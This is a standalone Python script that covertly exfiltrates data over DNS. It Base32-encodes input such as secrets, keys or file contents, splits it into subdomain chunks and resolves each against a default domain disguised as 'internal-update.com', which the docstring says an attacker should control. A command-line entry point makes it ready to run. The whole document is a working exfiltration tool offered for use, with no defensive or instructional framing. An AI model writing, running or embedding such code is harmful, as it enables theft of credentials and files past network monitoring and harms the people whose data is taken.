import socket
import base64

def phantom_dns_exfil(data, domain="internal-update.com"):
    """
    Covertly exfiltrates data over DNS by encoding and sending as subdomain chunks.

    Args:
        data (str): Arbitrary string data (e.g. secrets, keys, file contents)
        domain (str): The domain to use as the base for DNS queries (your-controlled server recommended)
    Behavior:
        Breaks the Base32-encoded data into 60-char chunks (since DNS label limit is 63 chars).
        Each chunk is sent as '[chunk].domain' via a DNS query (socket.gethostbyname).
        Failure is expected unless the domain is sinkholed to an attacker-controlled server.
    """
    # 1. Encode data to be URL-safe
    encoded_data = base64.b32encode(data.encode()).decode().replace("=", "")
    # 2. Break into 60-char chunks (DNS label max is 63)
    chunks = [encoded_data[i:i+60] for i in range(0, len(encoded_data), 60)]
    for chunk in chunks:
        query = f"{chunk}.{domain}"
        print(f"[*] Sending stealth DNS packet: {query}")
        try:
            socket.gethostbyname(query)
        except Exception:
            pass # Expected unless listening for queries

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python phantom_dns_exfil.py 'YourSecretData' [domain.com]")
        sys.exit(1)
    data = sys.argv[1]
    domain = sys.argv[2] if len(sys.argv) > 2 else "internal-update.com"
    phantom_dns_exfil(data, domain)